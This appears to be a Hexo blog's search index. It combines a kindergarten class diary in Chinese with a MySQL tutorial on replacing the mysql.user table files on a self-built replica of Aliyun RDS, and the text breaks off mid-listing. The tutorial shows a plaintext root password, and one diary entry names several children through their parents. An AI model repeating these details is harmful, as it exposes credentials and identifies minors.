<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/2020/03/22/booboo_others/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
      <categories>
        <category>技术广角</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>国庆前学洗手</title>
    <url>/2018/09/30/amy_life/%E5%9B%BD%E5%BA%86%E5%89%8D%E5%AD%A6%E6%B4%97%E6%89%8B/</url>
    <content><![CDATA[<p>今天人少，我们坐小月亮，然后给他们每人用了免洗洗手液，洗小手，国庆节出去不要忘记带哦</p>
<a id="more"></a>

<p align="center"><embed src='http://player.youku.com/player.php/sid/XMzg0Mzk0NDI5Ng==/v.swf' allowFullScreen='true' quality='high' width='480' height='400' align='middle' allowScriptAccess='always' type='application/x-shockwave-flash'></embed></p>

<p><img src="%E5%9B%BD%E5%BA%86%E5%89%8D%E5%AD%A6%E6%B4%97%E6%89%8B/01.jpg" alt=""></p>
<p>君君老师:<br>他们让我发给你们😂</p>
<p>小慈的晚托班制作五星红旗</p>
<p align="center"><embed src='http://player.youku.com/player.php/sid/XMzg0Mzk0OTg4MA==/v.swf' allowFullScreen='true' quality='high' width='480' height='400' align='middle' allowScriptAccess='always' type='application/x-shockwave-flash'></embed></p>]]></content>
      <categories>
        <category>往昔追忆</category>
        <category>小二班</category>
      </categories>
      <tags>
        <tag>宝宝成长</tag>
      </tags>
  </entry>
  <entry>
    <title>宝宝们上班啦</title>
    <url>/2018/09/29/amy_life/%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/</url>
    <content><![CDATA[<p>君君老师:<br>最近我们孩子的角色游戏慢慢进入状态了，但也有几个孩子沉迷于积木游戏无法自拔，我们希望家长们在家里也可以和孩子们一起玩角色扮演游戏，和孩子多互动，也可以拓宽思路，可以做现实生活中不能做的，比如仙女啊，公主啊，小士兵等等</p>
<a id="more"></a>

<p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/01.jpg" alt=""></p>
<p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/02.jpg" alt="02"></p>
<p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/03.jpg" alt="03"></p>
<p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/04.jpg" alt="04"></p>
<p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/05.jpg" alt="05"></p>
<p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/06.jpg" alt="06"></p>
<p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/07.jpg" alt="07"></p>
<p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/08.jpg" alt="08"></p>
<p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/09.jpg" alt="09"></p>
<p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/10.jpg" alt="10"></p>
<p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/11.jpg" alt="11"></p>
<p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/12.jpg" alt="12"></p>
<p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/13.jpg" alt="13"></p>
<p>君君老师:<br>今天我们还认识了五星红旗，知道自己是一个中国人，我告诉他们过几天要给祖国妈妈过生日了，要休息七天，有孩子还反驳说不行，休息三天就够了，哈哈我还告诉他们祖国妈妈会请他们吃生日蛋糕的</p>
<p>午餐前还额外学了一首歌，送给我们的祖国妈妈</p>
<p><a href="https://music.163.com/#/song?id=498555737&market=baiduqk" target="_blank" rel="noopener">儿歌-祖国祖国我爱你</a></p>
]]></content>
      <categories>
        <category>往昔追忆</category>
        <category>小二班</category>
      </categories>
      <tags>
        <tag>宝宝成长</tag>
      </tags>
  </entry>
  <entry>
    <title>月饼烘培和小小搬运工</title>
    <url>/2018/09/21/amy_life/%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/</url>
    <content><![CDATA[<p>中秋节快到了，老师带宝宝们一起做了月饼，拿去烤了，宝宝们还帮老师一起搬桌子，虽然结局差强人意，但是孩子们都很开心呢！</p>
<a id="more"></a>

<p align="center"><embed src='http://player.youku.com/player.php/sid/XMzg0Mzk0NDg5Ng==/v.swf' allowFullScreen='true' quality='high' width='480' height='400' align='middle' allowScriptAccess='always' type='application/x-shockwave-flash'></embed></p>

<p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/01.jpg" alt=""></p>
<p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/02.jpg" alt="02"></p>
<p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/03.jpg" alt="03"></p>
<p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/04.jpg" alt="04"></p>
<p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/05.jpg" alt="05"></p>
<p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/06.jpg" alt="06"></p>
<p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/07.jpg" alt="07"></p>
<p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/08.jpg" alt="08"></p>
<p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/09.jpg" alt="09"></p>
<p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/20.jpg" alt="20"></p>
<p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/00.png" alt=""></p>
]]></content>
      <categories>
        <category>往昔追忆</category>
        <category>小二班</category>
      </categories>
      <tags>
        <tag>宝宝成长</tag>
      </tags>
  </entry>
  <entry>
    <title>宝宝们开始漱口了</title>
    <url>/2018/09/20/amy_life/%E5%AE%9D%E5%AE%9D%E4%BB%AC%E5%BC%80%E5%A7%8B%E6%BC%B1%E5%8F%A3%E4%BA%86/</url>
    <content><![CDATA[<p>摘要：今天开始我们让宝宝们开始漱口了，所以回家也要继续保持这个好习惯哦～</p>
<a id="more"></a>


<p>君君老师语录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">各位亲们，通过昨天的家长会，我们看到了家长回去的努力，今天午饭明显进步的宝宝有：@张瑾安妈妈 @操梓桐妈妈 @但颐宸妈妈 @何晟睿妈妈 @张恬觅妈妈 @严魏慈妈妈 @王晟宁妈妈 ，其他宝宝们继续加油哦～</span><br><span class="line"></span><br><span class="line">吃饭我们是和孩子们说：小汽车装装满，转弯送到山洞里，滑滑梯滑到肚子里，因为很多宝宝勺子不对着嘴巴，所以饭宝宝掉在桌子上都哭了。</span><br><span class="line"></span><br><span class="line">另外，今天我们练习了宝宝们排队走楼梯，大多数已经像模像样的了，上下楼梯靠右走了，今天的运动量有点大，所以估计宝贝们今晚又要早早睡觉了.</span><br></pre></td></tr></table></figure>



<p>今天开始我们让宝宝们开始漱口了，所以回家也要继续保持这个好习惯哦～</p>
<p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E5%BC%80%E5%A7%8B%E6%BC%B1%E5%8F%A3%E4%BA%86/01.jpg" alt=""></p>
]]></content>
      <categories>
        <category>往昔追忆</category>
        <category>小二班</category>
      </categories>
      <tags>
        <tag>宝宝成长</tag>
      </tags>
  </entry>
  <entry>
    <title>家长会</title>
    <url>/2018/09/19/amy_life/%E5%AE%B6%E9%95%BF%E4%BC%9A/</url>
    <content><![CDATA[<p>摘要：幼儿园开学第10天，宝宝们逐渐稳定，融入这个大家庭，今天老师和我们分享宝宝们的幼儿园日常生活，以及我们对我们家长的一些建议，非常地用心。</p>
<a id="more"></a>

<p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/001.jpg" alt=""></p>
<p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/002.jpg" alt="002"></p>
<p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/003.jpg" alt="003"></p>
<p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/004.jpg" alt="004"></p>
<p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/005.jpg" alt="005"></p>
<p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/006.jpg" alt="006"></p>
<p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/007.jpg" alt="007"></p>
<p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/008.jpg" alt="008"></p>
<p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/010.jpg" alt="010"></p>
<p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/011.jpg" alt="011"></p>
<p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/012.jpg" alt="012"></p>
<p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/013.jpg" alt="013"></p>
<p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/014.jpg" alt="014"></p>
<p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/015.jpg" alt="015"></p>
<p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/016.jpg" alt="016"></p>
<p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/017.jpg" alt="017"></p>
<p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/018.jpg" alt="018"></p>
<p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/019.jpg" alt="019"></p>
<p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/020.jpg" alt="020"></p>
<p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/021.jpg" alt="021"></p>
<p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/022.jpg" alt="022"></p>
<p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/023.jpg" alt="023"></p>
<p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/024.jpg" alt="024"></p>
<p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/025.jpg" alt="025"></p>
<p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/026.jpg" alt="026"></p>
<p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/027.jpg" alt="027"></p>
<p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/028.jpg" alt="028"></p>
<p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/029.jpg" alt="029"></p>
<p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/030.jpg" alt="030"></p>
]]></content>
      <categories>
        <category>往昔追忆</category>
        <category>小二班</category>
      </categories>
      <tags>
        <tag>宝宝成长</tag>
      </tags>
  </entry>
  <entry>
    <title>向月亮说晚安</title>
    <url>/2018/09/10/amy_life/%E5%90%91%E6%9C%88%E4%BA%AE%E8%AF%B4%E6%99%9A%E5%AE%89/</url>
    <content><![CDATA[<p>摘要：今天中午讲了一个关于「晚安，月亮」的睡前故事，最后猫头鹰对月亮说了晚安，大家今天睡前还可以和宝宝说哦，再加一些其他的动物宝宝</p>
<a id="more"></a>

<p><img src="%E5%90%91%E6%9C%88%E4%BA%AE%E8%AF%B4%E6%99%9A%E5%AE%89/01.jpg" alt=""></p>
<p><img src="%E5%90%91%E6%9C%88%E4%BA%AE%E8%AF%B4%E6%99%9A%E5%AE%89/02.jpg" alt="02"></p>
<p><img src="%E5%90%91%E6%9C%88%E4%BA%AE%E8%AF%B4%E6%99%9A%E5%AE%89/03.jpg" alt="03"></p>
<p><img src="%E5%90%91%E6%9C%88%E4%BA%AE%E8%AF%B4%E6%99%9A%E5%AE%89/04.jpg" alt="04"></p>
<p><img src="%E5%90%91%E6%9C%88%E4%BA%AE%E8%AF%B4%E6%99%9A%E5%AE%89/05.jpg" alt="05"></p>
<p><img src="%E5%90%91%E6%9C%88%E4%BA%AE%E8%AF%B4%E6%99%9A%E5%AE%89/06.jpg" alt="06"></p>
<p><img src="%E5%90%91%E6%9C%88%E4%BA%AE%E8%AF%B4%E6%99%9A%E5%AE%89/07.jpg" alt="07"></p>
]]></content>
      <categories>
        <category>往昔追忆</category>
        <category>小二班</category>
      </categories>
      <tags>
        <tag>宝宝成长</tag>
      </tags>
  </entry>
  <entry>
    <title>突破阿里限制实现&quot;RDS For MySQL 5.7到自建MySQL主从&quot;</title>
    <url>/2018/08/22/booboo_others/rds-for-mysql-5-7%E5%88%B0%E8%87%AA%E5%BB%BAMySQL%E4%B8%BB%E4%BB%8E%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3user%E8%A1%A8%E5%AE%9E%E7%8E%B0%E4%BB%8E%E5%BA%93%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E6%9B%B4%E6%94%B9%E5%8A%9F%E8%83%BD/</url>
    <content><![CDATA[<p>摘要: 阿里云的RDS For MySQL 5.7 到线下IDC机房的主从搭建相信看官方文档就可以完成，但是搭建之后却发现无法在本地进行认证权限的管理，这是为何？而阿里官方推荐使用DTS同步工具去实现，这个费用着实不少，又是否能够破解呢？本文详解如何暴力破解user表实现从库用户权限更改功能</p>
<a id="more"></a>

<h1 id="故事背景"><a href="#故事背景" class="headerlink" title="故事背景"></a>故事背景</h1><h2 id="数据库明细"><a href="#数据库明细" class="headerlink" title="数据库明细"></a>数据库明细</h2><p>说在前面：</p>
<ul>
<li>云上数据库： RDS For MySQL 5.7.20 普通用户权限</li>
<li>IDC数据库: MySQL 5.7.20 </li>
</ul>
<h2 id="故事情节"><a href="#故事情节" class="headerlink" title="故事情节"></a>故事情节</h2><p>现需要搭建RDS For MySQL 到线下IDC机房的主从，问题如下：</p>
<h3 id="同步系统表失败"><a href="#同步系统表失败" class="headerlink" title="同步系统表失败"></a>同步系统表失败</h3><h4 id="故障原因"><a href="#故障原因" class="headerlink" title="故障原因"></a>故障原因</h4><ul>
<li>RDS For MySQL 5.7.20 到自建MySQL 5.7.20主从同步异常的原因为RDS与MySQL官方版本使用的系统库不同</li>
<li>自建MySQL 5.7.20 无法同步主库RDS的系统表</li>
<li>自建MySQL 5.7.20 恢复RDS的全备份数据后无法执行授权语句,报错如下：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ERROR 1785 (HY000): Statement violates GTID consistency: Updates to non-transactional tables can only be done in either autocommitted statements or single-statement transactions, and never in the same statement as updates to transactional tables.</span><br></pre></td></tr></table></figure>

<ul>
<li>自建MySQL 5.7.20 恢复RDS的全备份数据后无法对系统表执行更新操作，报错如下：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ERROR 1064 (42000): Unknown trigger has an error in its body: 'Unknown system variable 'maintain_user_list''</span><br></pre></td></tr></table></figure>

<h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><ul>
<li>跳过系统表的同步</li>
</ul>
<hr>
<h3 id="从库添加认证授权失败"><a href="#从库添加认证授权失败" class="headerlink" title="从库添加认证授权失败"></a>从库添加认证授权失败</h3><p>RDS For MySQL 5.7.20 到自建MySQL 5.7.20 搭建主从同步架构:</p>
<ul>
<li>配置从库不同步RDS主库的系统表</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># skip rep</span><br><span class="line">replicate_wild_ignore_table&#x3D;mysql.%</span><br><span class="line">replicate_wild_ignore_table&#x3D;sys.%</span><br><span class="line">replicate_wild_ignore_table&#x3D;information_schema.%</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>非系统库数据同步正常</strong></li>
<li>从库无法执行grant命令，即无法添加授权信息</li>
<li>从库无法对系统表mysql.user表执行insert操作</li>
<li>从库无法对系统表mysql.user表执行updat操作</li>
</ul>
<p>报错如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ERROR 1064 (42000): Unknown trigger has an error in its body: 'Unknown system variable 'maintain_user_list''</span><br></pre></td></tr></table></figure>

<h4 id="失败原因"><a href="#失败原因" class="headerlink" title="失败原因"></a>失败原因</h4><p><strong>阿里工单答复</strong>：RDS 目前已经不支持 MYISAM 引擎创建了。所以如果是通过自建的replication 同步 就会有这个问题的，RDS 统一INNOB 引擎。<br>如果需求是从RDS 到自建数据库的同步关系，建议您使用DTS 做业务数据的同步。</p>
<h4 id="探索解决方法"><a href="#探索解决方法" class="headerlink" title="探索解决方法"></a>探索解决方法</h4><h5 id="从库尝试使用MySQL8-0-11"><a href="#从库尝试使用MySQL8-0-11" class="headerlink" title="从库尝试使用MySQL8.0.11"></a>从库尝试使用<code>MySQL8.0.11</code></h5><p>RDS For MySQL 5.7的备份文件 到线下自建MYSQL 8.0.11 无法恢复数据。因此该方法不可行。</p>
<h5 id="尝试临时关闭GTID模式"><a href="#尝试临时关闭GTID模式" class="headerlink" title="尝试临时关闭GTID模式"></a>尝试临时关闭GTID模式</h5><ol>
<li>临时停止slave同步</li>
<li>修改配置关闭gtid模式</li>
<li>重启服务</li>
</ol>
<p>对系统表mysql.user测试明细：</p>
<table>
<thead>
<tr>
<th>No.</th>
<th>测试项目</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>是否能够执行grant命令</td>
<td>×</td>
</tr>
<tr>
<td>2</td>
<td>是否能够执行update命令</td>
<td>×</td>
</tr>
<tr>
<td>3</td>
<td>是否能够执行insert命令</td>
<td>×</td>
</tr>
</tbody></table>
<p>该方法同样无法解决。</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 权限相关的一些表：</span></span><br><span class="line">SCHEMA_PRIVILEGES：提供了数据库的相关权限，这个表是内存表是从mysql.db中拉去出来的。</span><br><span class="line">TABLE_PRIVILEGES:提供的是表权限相关信息，信息是从 mysql.tables_priv 表中加载的</span><br><span class="line">COLUMN_PRIVILEGES ：这个表可以清楚就能看到表授权的用户的对象，那张表那个库以及授予的是什么权限，如果授权的时候加上with grant option的话，我们可以看得到PRIVILEGE_TYPE这个值必须是YES。</span><br><span class="line">USER_PRIVILEGES:提供的是表权限相关信息，信息是从 mysql.user 表中加载的</span><br><span class="line">通过表我们可以很清晰看得到MySQL授权的层次，SCHEMA，TABLE，COLUMN级别，当然这些都是基于用户来授予的</span><br></pre></td></tr></table></figure>

<p>从数据库用户权限管理的原理可以了解到管理用户的是<code>user</code>表，如果要更细致的权限还需要<code>db</code>表和<code>tables_priv</code>表。<em>（本文只从user表着手）</em></p>
<h3 id="步骤概览"><a href="#步骤概览" class="headerlink" title="步骤概览"></a>步骤概览</h3><ol>
<li>创建新的user_1表</li>
<li>对user_1表添加新的用户</li>
<li>停服务</li>
<li>将user_1替换user表</li>
<li>启动该服务</li>
<li>可以通过update、insert、delete操作user表来添加权限（grant无法操作）</li>
</ol>
<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@MySQL-01 10:35:  [mysql]&gt; create table user_1 like user;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:36:  [mysql]&gt; select * from user_1;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:36:  [mysql]&gt; show table status like user;</span><br><span class="line">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'user' at line 1</span><br><span class="line">root@MySQL-01 10:36:  [mysql]&gt; show table status like 'user_1';</span><br><span class="line">+--------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+------------+-----------+----------+----------------+-----------------------------+</span><br><span class="line">| Name   | Engine | Version | Row_format | Rows | Avg_row_length | Data_length | Max_data_length | Index_length | Data_free | Auto_increment | Create_time         | Update_time         | Check_time | Collation | Checksum | Create_options | Comment                     |</span><br><span class="line">+--------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+------------+-----------+----------+----------------+-----------------------------+</span><br><span class="line">| user_1 | MyISAM |      10 | Dynamic    |    0 |              0 |           0 | 281474976710655 |         1024 |         0 |           NULL | 2019-01-04 10:36:00 | 2019-01-04 10:36:00 | NULL       | utf8_bin  |     NULL |                | Users and global privileges |</span><br><span class="line">+--------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+------------+-----------+----------+----------------+-----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:36:  [mysql]&gt; show table status like 'user';</span><br><span class="line">+------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+---------------------+-----------+----------+----------------+-----------------------------+</span><br><span class="line">| Name | Engine | Version | Row_format | Rows | Avg_row_length | Data_length | Max_data_length | Index_length | Data_free | Auto_increment | Create_time         | Update_time         | Check_time          | Collation | Checksum | Create_options | Comment                     |</span><br><span class="line">+------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+---------------------+-----------+----------+----------------+-----------------------------+</span><br><span class="line">| user | MyISAM |      10 | Dynamic    |    3 |             53 |         160 | 281474976710655 |         2048 |         0 |           NULL | 2015-05-22 15:24:42 | 2019-01-04 09:27:49 | 2015-05-22 15:33:22 | utf8_bin  |     NULL |                | Users and global privileges |</span><br><span class="line">+------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+---------------------+-----------+----------+----------------+-----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:36:  [mysql]&gt; insert into user_1 select * from user;</span><br><span class="line">Query OK, 3 rows affected (0.00 sec)</span><br><span class="line">Records: 3  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:36:  [mysql]&gt; select * from user_1;</span><br><span class="linespan><br><span class="line">| Host      | User | Password | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin | authentication_string |</span><br><span class="linespan><br><span class="line">| localhost | root |          | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |</span><br><span class="line">| 127.0.0.1 | root |          | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |</span><br><span class="line">| ::1       | root |          | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |</span><br><span class="linespan><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:36:  [mysql]&gt; select user,host,authentication_string from user_1;</span><br><span class="line">+------+-----------+-----------------------+</span><br><span class="line">| user | host      | authentication_string |</span><br><span class="line">+------+-----------+-----------------------+</span><br><span class="line">| root | localhost |                       |</span><br><span class="line">| root | 127.0.0.1 |                       |</span><br><span class="line">| root | ::1       |                       |</span><br><span class="line">+------+-----------+-----------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:36:  [mysql]&gt; update user_1 set authentication_string=password('(Uploo00king)') where user='root';</span><br><span class="line">Query OK, 3 rows affected, 1 warning (0.01 sec)</span><br><span class="line">Rows matched: 3  Changed: 3  Warnings: 1</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:37:  [mysql]&gt; select user,host,authentication_string from user_1;</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">| user | host      | authentication_string                     |</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">| root | localhost | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">| root | 127.0.0.1 | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">| root | ::1       | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:37:  [mysql]&gt; exit</span><br><span class="line">Bye</span><br><span class="line">[root@sh_02 data]# /etc/init.d/mysqld stop</span><br><span class="line">Shutting down MySQL..                                      [  OK  ]</span><br><span class="line">[root@sh_02 mysql]# ll user_1*</span><br><span class="line">-rw-r-----. 1 mysql mysql 10630 Jan  4 10:36 user_1.frm</span><br><span class="line">-rw-r-----. 1 mysql mysql   328 Jan  4 10:37 user_1.MYD</span><br><span class="line">-rw-r-----. 1 mysql mysql  2048 Jan  4 10:37 user_1.MYI</span><br><span class="line">[root@sh_02 mysql]# mv user_1.frm user.frm</span><br><span class="line">[root@sh_02 mysql]# mv user_1.MYD user.MYD</span><br><span class="line">[root@sh_02 mysql]# mv user_1.MYI user.MYI</span><br><span class="line">[root@sh_02 mysql]# ll user*</span><br><span class="line">-rw-r-----. 1 mysql mysql 10630 